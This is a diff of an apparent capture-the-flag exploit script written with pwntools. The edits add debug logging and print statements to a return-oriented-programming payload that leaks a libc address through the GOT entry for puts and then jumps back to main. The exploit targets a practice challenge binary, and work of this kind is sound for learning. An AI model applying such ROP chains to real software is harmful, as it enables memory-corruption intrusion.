@@ -16,7 +16,7 @@ LIBC = ELF('chall/libc.so.6')
 LD = ELF('chall/ld-linux-x86-64.so.2')
 ENV = {"LD_PRELOAD": LIBC.path}
 context.terminal = TERMINAL_CONFIG
-# context.log_level = 'debug'  # Enables printing of all traffic
+context.log_level = 'debug'  # Enables printing of all traffic
 
 # readint_offset = exe.sym.read_int
 # CREATE_LEVEL_RET_OFS = 0x4011b7
@@ -82,13 +82,16 @@ puts = p64(0x401243)
 # 5. jump back to main to get second payload (note: jump back all the way to not deal with leave shenanigans)
 main_restart = p64(0x4011BC)
 
+print("Building payload")
 
 payload = padding + rbp + nop_gadget + read_int + puts + main_restart
-
+print("First payload: ", payload)
 print("Payload length: ", len(payload))
-
+print("Sending first payload")
 # Send first payload
 p.sendline(payload)
+
+print("Navigating to return...")
 
 # Navigate to return
 p.recvuntil(b"2. Creative")
@@ -101,7 +104,7 @@ p.sendline(b"2")
 # Respond to first payload with libc leak pointer
 got_puts = exe.got.puts
 got_puts_str = str(got_puts)
-p.sendline(got_puts_str)
+p.sendline(bytes(got_puts_str, 'utf-8'))
 
 # Sends a line for some reason
 p.recvline()
